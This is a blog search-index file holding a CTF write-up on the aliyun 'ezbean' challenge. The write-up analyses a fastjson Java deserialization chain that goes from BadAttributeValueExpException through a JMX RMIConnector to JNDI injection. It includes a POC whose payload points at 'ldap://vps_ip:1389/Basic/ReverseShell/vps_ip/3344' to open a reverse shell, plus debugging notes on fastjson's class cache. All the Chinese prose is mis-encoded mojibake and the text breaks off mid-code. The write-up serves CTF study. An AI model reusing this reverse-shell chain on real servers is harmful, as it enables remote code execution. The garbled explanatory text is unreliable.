<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[aliyun CTF] ezbeanåˆ†æä¸æ€è€ƒ</title>
      <link href="/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/"/>
      <url>/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="aliyun-CTF-ezbeanåˆ†æä¸æ€è€ƒ"><a href="#aliyun-CTF-ezbeanåˆ†æä¸æ€è€ƒ" class="headerlink" title="aliyun CTF ezbeanåˆ†æä¸æ€è€ƒ"></a>aliyun CTF ezbeanåˆ†æä¸æ€è€ƒ</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å¤ç°é˜¿é‡Œäº‘çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¾ˆå¥‡æ€ªã€å¾ˆç„å­¦çš„ç‚¹ï¼Œå®˜æ–¹å’Œå† å†›wpéƒ½æ˜¯ä¸€ç¬”å¸¦è¿‡äº†ï¼Œå®˜æ–¹ä¹Ÿæ²¡ç»™expï¼Œå°±è¯•ç€è‡ªå·±ç¡¬è°ƒï¼Œè°ƒç€è°ƒç€æœ‰ç‚¹ä¸Šå¤´ï¼Œåº”è¯¥æ²¡äººå‘è¿‡å§ï¼Œæˆ‘çŒœçš„ğŸ˜‚</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>FastJsonååºåˆ—åŒ–ä¸­æœ‰å¸¸è§çš„é“¾ï¼ŒBadAttributeValueExpExceptionè§¦å‘çš„JSON#toString-ã€‹getteræ–¹æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹å¤æ‚ï¼Œä¹Ÿä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjsonå’ŒåŸç”Ÿååºåˆ—åŒ–</a></p><h2 id="0x01-é¢˜ç›®èƒŒæ™¯"><a href="#0x01-é¢˜ç›®èƒŒæ™¯" class="headerlink" title="0x01 é¢˜ç›®èƒŒæ™¯"></a>0x01 é¢˜ç›®èƒŒæ™¯</h2><h3 id="ååºåˆ—åŒ–ç‚¹"><a href="#ååºåˆ—åŒ–ç‚¹" class="headerlink" title="ååºåˆ—åŒ–ç‚¹"></a>ååºåˆ—åŒ–ç‚¹</h3><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªå¯ä»¥ååºåˆ—åŒ–å‚æ•°dataä¼ å…¥æ•°æ®çš„è·¯ç”±read</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png" alt="image-20230504230327231"></p><blockquote><p>è¿™é‡Œçš„<code>MyObjectInputStream</code>ç»§æ‰¿è‡ª<code>ObjectInputStream</code>,è°ƒç”¨readObjectæ–¹ä¼šå…ˆè¿›å…¥resolveClasså…·ä½“è°ƒç”¨æ ˆå¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236187.png" alt="image-20230504233800680"></p></blockquote><p>è·Ÿè¿›resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>   <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<span class="hljs-comment">//*</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªé»‘åå•è¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><span class="hljs-comment">//...  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡ç»å®æµ‹è¿™ä¸ªé»‘åå•ä¼¼ä¹èµ·ä¸åˆ°è¿‡æ»¤çš„ä½œç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236143.png" alt="image-20230504234209559"></p></blockquote><h2 id="0x02-é—®é¢˜å‘ç°"><a href="#0x02-é—®é¢˜å‘ç°" class="headerlink" title="0x02 é—®é¢˜å‘ç°"></a>0x02 é—®é¢˜å‘ç°</h2><h3 id="é™åˆ¶åˆ†æ"><a href="#é™åˆ¶åˆ†æ" class="headerlink" title="é™åˆ¶åˆ†æ"></a>é™åˆ¶åˆ†æ</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p><p><code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p>è¿™é‡Œæä¸€ä¸‹fastjsonä¸­çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œç”±äºObjectInputStreamçš„ä¸å®‰å…¨æ€§ï¼Œfastjsonåœ¨è°ƒç”¨<code>JSONArray/JSONObject</code>çš„readObjectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>å¤„ç†ï¼Œè¿™ä¸ªç±»å¯ä»¥ç†è§£æˆæ˜¯å®‰å…¨çš„<code>ObjectInputStream</code>ï¼Œä¸‹å›¾ä¸ºå§”æ‰˜èµ·ç‚¹(<code>ObjectInputStream#defaultReadObject</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236065.png" alt="image-20230504235432194"></p><p>ä¹‹åçš„è¿‡ç¨‹æ„Ÿå…´è¶£å¯ä»¥è°ƒä¸€ä¸‹çœ‹ä¸‹è°ƒç”¨æ ˆï¼Œå‡ ä¸ªèŠ‚ç‚¹å¦‚ä¸‹ï¼ˆå¤ªå¤šäº†ï¼Œåªé€‰äº†å…¶ä¸­å‡ ä¸ªï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream #defaultReadObject<br>ObjectInputStream #ReadObject<br>ObjectInputStream #ReadObject0<br>ObjectInputStream #readNonProxyDesc<br>SecureObjectInputStream #resolveClass<br></code></pre></td></tr></table></figure><p>å…³æ³¨ä¸€ä¸‹resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>    <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> name.lastIndexOf(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>            name = name.substring(index + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span> &amp;&amp; name.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;;&#x27;</span>) &#123;<br>            name = name.substring(<span class="hljs-number">1</span>, name.length() - <span class="hljs-number">1</span>);<br>        &#125;<br>        ParserConfig.global.checkAutoType(name, <span class="hljs-literal">null</span>, Feature.SupportAutoType.mask);<span class="hljs-comment">//é‡ç‚¹ï¼Œè°ƒç”¨äº†checkAutoTypeæ–¹æ³•</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ååºåˆ—åŒ–å¤±è´¥çš„å¤§å¤šæ•°åŸå› éƒ½æ˜¯checkAutoTypeå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºäº†JSONExceptionå¼‚å¸¸</p></blockquote><p>è¿™ä¸ªå¼‚å¸¸å¤§æ¦‚å­—ç¬¦ä¸²æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">default</span> constructor not found. <span class="hljs-keyword">class</span> <span class="hljs-title class_">xxxxx</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ä¹‹å‰çš„é“¾å­å°±æ‰“ä¸é€šäº†ï¼ŒåŸæ¥æœ‰Fastjsonååºåˆ—åŒ–çš„é“¾å­æ€è·¯æ˜¯ä»<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>ï¼Œè¿›è€Œæœ€åèƒ½è§¦å‘ä»»æ„ç±»çš„getter(å°±æ˜¯ç±»çš„æ–¹æ³•åä»¥getå¼€å¤´çš„)ï¼Œå›çœ‹è¿™é¢˜ç»™çš„MyBeanï¼Œé‡Œé¢æœ‰ä¸ª<code>getConnect</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConnect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-built_in">this</span>.conn.connect();<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">//   private JMXConnector conn;</span><br></code></pre></td></tr></table></figure><blockquote><p>åªè¦æˆ‘ä»¬èƒ½è§¦å‘getConnectï¼Œå°†connè®¾ç½®ä¸ºRMIConnectorï¼Œå¯ä»¥è§¦å‘JNDIæ³¨å…¥ï¼Œä¹‹åä¹Ÿå°±èƒ½åå¼¹shelläº†</p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jmxurl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;<br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(jmxurl);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>com.ctf.ezser.bean.<span class="hljs-type">MyBean</span> <span class="hljs-variable">mb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="hljs-string">&quot;sssaaaa&quot;</span>,rmi);<br><br>com.alibaba.fastjson.<span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONArray();<br>jsonArray.add(mb);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal">true</span>);<br>valfield.set(val, jsonArray);<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(val);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>System.out.println(ret);<br></code></pre></td></tr></table></figure><h3 id="ç„å­¦äº‹ä»¶"><a href="#ç„å­¦äº‹ä»¶" class="headerlink" title="ç„å­¦äº‹ä»¶"></a>ç„å­¦äº‹ä»¶</h3><p>æŒ‰ç†æ¥è¯´ï¼Œæ ¹æ®ä¸Šè¿°é“¾å­æ„é€ çš„ååºåˆ—åŒ–åº”è¯¥ä¼šè¢«SecureObjectInputStreamæ‹¦æˆªï¼Œè¿›è€Œæ‰§è¡Œ<code>checkAutoType</code>ç„¶åæŠ›å‡ºJSONExceptionå¼‚å¸¸ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œä½†ç¥å¥‡çš„æ˜¯å‰ä¸¤æ¬¡ååºåˆ—åŒ–ä¸€å®šå¤±è´¥ï¼Œè€Œä»ç¬¬ä¸‰æ¬¡å¼€å§‹å°±èƒ½æˆåŠŸå¹¶åå¼¹shellã€‚å¹¶ä¸”å®˜æ–¹wpä¹Ÿç”¨çš„è¿™æ¡é“¾å­ï¼Œä½†å†™å¾—è¿‡äºç®€çŸ­ï¼Œçœ‹å† å†›é˜Ÿçš„wpè¯´æ˜¯fjçš„éšæœºæ„é€ å‡½æ•°é—®é¢˜ï¼Œåæ¥è°ƒäº†ä¸€ä¸‹æ„Ÿè§‰å¯èƒ½ä¸æ˜¯è¿™ä¸ªåŸå› </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237675.png" alt="image-20230505012846237"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºä¸‰æ¬¡åªæ˜¯å·§åˆï¼Œåæ¥æ¯æ¬¡éªŒè¯éƒ½æ˜¯ä¸‰æ¬¡ã€‚å¹¶ä¸”ç¬¬ä¸€æ¬¡æ˜¯<code>default constructor not found. class xxx.RMIConnector</code>ç¬¬äºŒæ¬¡æ˜¯<code>default constructor not found. class xxx.JMXServiceURL</code></p><p>è¿™é‡Œå…ˆæä¸€ä¸‹checkAutoTypeé€šè¿‡typeNameæ‰¾ç±»çš„ä¸‰ç§æ–¹å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//ğŸŒŸ</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç»è¿‡æµ‹è¯•ï¼Œæœ€ä¸»è¦çš„æ–¹æ³•æ˜¯<code>TypeUtils.getClassFromMapping</code>è¿™ä¸ªæ–¹æ³•ä¼šå»TypeUtilsçš„mappingsæˆå‘˜é‡Œæ‰¾æ˜¯å¦æœ‰ä»¥typeNameä¸ºNameçš„ç±»ï¼ˆğŸŒŸğŸŒŸè¿™ä¸ªå¾ˆé‡è¦ è®°ä¸€ä¸‹ï¼‰mappingsæ˜¯é™æ€ç§æœ‰æˆå‘˜ï¼Œåœ¨åˆå§‹åŒ–æ—¶å°±æ”¾å…¥äº†107ä¸ªå¸¸è§ç±»ï¼ˆä¹Ÿæ˜¯SecureObjectInputStreamè®¤ä¸ºæ˜¯å®‰å…¨çš„ç±»ï¼‰</p></blockquote><p>è°ƒçš„è¿‡ç¨‹ä¸­å‘ç°ä¸‰æ¬¡æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œè¿™ä¸ªmappingsæˆå‘˜çš„sizeåˆ†åˆ«æ˜¯108ã€109ã€110ï¼Œè€Œåœ¨110æ—¶ååºåˆ—åŒ–æˆåŠŸï¼Œæƒ³å¿…å¤§å®¶çœ‹åˆ°è¿™é‡Œéƒ½èƒ½å‘ç°è¿™ä¸ªå…³é”®ç‚¹äº†ï¼Œä¹Ÿèƒ½çŒœæµ‹åˆ°å‰ä¸¤æ¬¡å·¥ä½œæ˜¯æŠŠæŠ›å‡ºå¼‚å¸¸æ²¡æ‰¾åˆ°é‚£ä¸ªç±»æ·»åŠ è¿›mappings</p><h2 id="0x03-è°ƒè¯•åˆ†æ"><a href="#0x03-è°ƒè¯•åˆ†æ" class="headerlink" title="0x03 è°ƒè¯•åˆ†æ"></a>0x03 è°ƒè¯•åˆ†æ</h2><p>ç†è®ºä¸Šæ˜¯è¯´å¾—é€šäº†ï¼Œè¿˜å¾—æ˜¯è°ƒè¯•ä¸€ä¸‹æ¥éªŒè¯</p><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><p>è¿™é¢˜é‡Œèƒ½ä¼ å…¥checkAutoTypeå»å¯»æ‰¾çš„éåŸç”Ÿç±»åªæœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.ctf.ezser.bean.MyBean <span class="hljs-comment">//ååºåˆ—åŒ–ç»ˆç‚¹ï¼Œè¢«è°ƒç”¨getConnect-ã€‹this.conn.connect();</span><br>javax.management.remote.rmi.RMIConnector <span class="hljs-comment">//ä¼ å…¥MyBeanæ„é€ å‡½æ•°ç»™connèµ‹å€¼</span><br>javax.management.remote.JMXServiceURL  <span class="hljs-comment">//ç”¨äºä¼ å…¥RMIConnectoræ„é€ å‡½æ•°</span><br></code></pre></td></tr></table></figure><h3 id="å¼‚å¸¸ä¿¡å·å¯»æ‰¾"><a href="#å¼‚å¸¸ä¿¡å·å¯»æ‰¾" class="headerlink" title="å¼‚å¸¸ä¿¡å·å¯»æ‰¾"></a>å¼‚å¸¸ä¿¡å·å¯»æ‰¾</h3><p>é¦–å…ˆå…ˆæ‰¾ä¸€ä¸‹è¿™ä¸ªä¸€ç›´æŠ¥é”™çš„<code>default constructor not found. class xxx</code>å­—æ®µï¼Œæ‰¾å‡ºæ¥æ˜¯åœ¨<code>JavaBeanInfo#build</code>æ–¹æ³•çš„æŸå¤„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> ((!kotlin)<br>            &amp;&amp; !clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="hljs-literal">null</span>, creatorConstructor, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, jsonType, fieldList);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;default constructor not found. &quot;</span> + clazz);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™é¢˜çš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­kotlinéƒ½ä¸ºfalseï¼Œå› æ­¤å…³æ³¨ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œç»è°ƒè¯•ï¼Œèµ°åˆ°è¿™ä¸€æ­¥çš„clazzéƒ½ä¸ä¼šæ˜¯<code>javax.servlet.http.Cookie</code>ï¼Œè€Œæ˜¯ä¸Šé¢ä¸‰ä¸ªå‰ææ¡ä»¶ä¸­çš„åä¸¤ä¸ª</p></blockquote><p>checkAutoTypeæ–¹æ³•åç»­ä¼šåˆ›å»ºä¸€ä¸ªJavaBeanInfoè°ƒç”¨clazzæ–¹æ³•ï¼Œä¸è¿‡å‰ææ˜¯å‰ä¸€ä¸ªifæ²¡æœ‰æˆåŠŸçš„returnè·³å‡ºå‡½æ•°ï¼Œä»ä¸‹é¢ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœä¸‰ç§æ–¹æ³•éƒ½æ‰¾ä¸åˆ°classï¼Œä¹Ÿå°±ä¸ä¼šæå‰é€€å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-comment">//...ğŸŒŸğŸŒŸ</span><br>  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>      <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>  &#125;<span class="hljs-comment">//***å¤„</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);<br>    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>è‹¥æ²¡æœ‰æå‰é€€å‡ºä¼šæ¥åˆ°ä¸Šé¢æ ‡è¯†çš„<code>***</code>å¤„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ“ä½œï¼ŒæŠŠè¿˜æ²¡æ‰¾åˆ°çš„ç±»çš„ç±»åtypeNameæ·»åŠ è¿›TypeUtilsçš„mappingsä¸­ï¼Œä½¿ç”¨ç±»åŠ è½½å™¨åŠ è½½è¯¥ç±»å¹¶èµ‹å€¼ç»™clazzï¼Œè¿™é‡Œå¯ä»¥ç®€å•çœ‹ä¸€ä¸‹TypeUtils.loadClasså…³é”®éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(classLoader != <span class="hljs-literal">null</span>)&#123;<br> clazz = classLoader.loadClass(className);<br> <span class="hljs-keyword">if</span> (cache) &#123;<br>     mappings.put(className, clazz);<br> &#125;<br> <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ€»ç»“ä¸€ä¸‹ä¼ å…¥<code>ParserConifg#checkAutoType</code>çš„ç±»åä¼šç»å†ä»¥ä¸‹è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 